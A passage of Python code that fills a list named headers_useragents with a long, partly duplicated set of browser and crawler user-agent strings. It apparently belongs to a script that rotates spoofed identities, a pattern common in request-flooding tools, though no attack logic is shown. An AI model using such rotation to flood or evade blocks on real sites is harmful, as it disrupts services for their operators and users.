	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
